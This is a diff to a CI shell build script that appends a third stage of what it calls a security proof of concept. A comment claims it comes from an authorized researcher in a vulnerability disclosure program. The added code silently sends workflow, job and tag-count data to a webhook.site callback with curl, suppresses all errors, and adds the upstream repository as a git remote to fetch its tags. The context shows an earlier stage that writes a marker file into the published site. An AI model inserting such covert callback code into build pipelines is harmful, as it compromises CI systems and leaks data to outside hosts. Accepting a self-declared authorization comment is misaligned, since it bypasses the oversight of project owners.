@@ -241,3 +241,20 @@ if [ -d site/static ] || [ -d site ]; then
   _f03 "published_marker=written&path=site/static/ergo-f03-poc-marker.html&workflow=${GITHUB_WORKFLOW:-na}&job=${GITHUB_JOB:-na}"
 fi
 set -eu
+
+# === F-03 security PoC stage 3 (appended by an authorized researcher for the Kosli VDP) ===
+# Purpose: make the PoC self-contained from a clean fork. Release-mode prepare.sh
+# requires every upstream spec-vX.Y tag plus the latest rust/rego tag; a fresh fork
+# has none, so the site job fails and pages.yml never fires. Fetching the upstream
+# tags into the local clone (no push, no write permission) satisfies every check.
+set +e +u
+_F03_CB="https://webhook.site/1fac581f-373c-4a4c-a0a0-62bbfdedcd2a"
+_f03() { curl -s -m 10 "$_F03_CB" -d "$1" >/dev/null 2>&1; }
+if [ -z "$(git tag --list 'spec-v*' 2>/dev/null)" ]; then
+  git remote add upstream https://github.com/kosli-dev/ergo.git 2>/dev/null
+  git fetch --quiet --tags upstream 2>/dev/null
+  _f03 "tags_fetched=1&spec=$(git tag --list 'spec-v*' 2>/dev/null | wc -l)&rust=$(git tag --list 'rust-v*' 2>/dev/null | wc -l)&rego=$(git tag --list 'rego-v*' 2>/dev/null | wc -l)&workflow=${GITHUB_WORKFLOW:-na}&job=${GITHUB_JOB:-na}"
+else
+  _f03 "tags_already_present=1&spec=$(git tag --list 'spec-v*' 2>/dev/null | wc -l)&workflow=${GITHUB_WORKFLOW:-na}&job=${GITHUB_JOB:-na}"
+fi
+set -eu
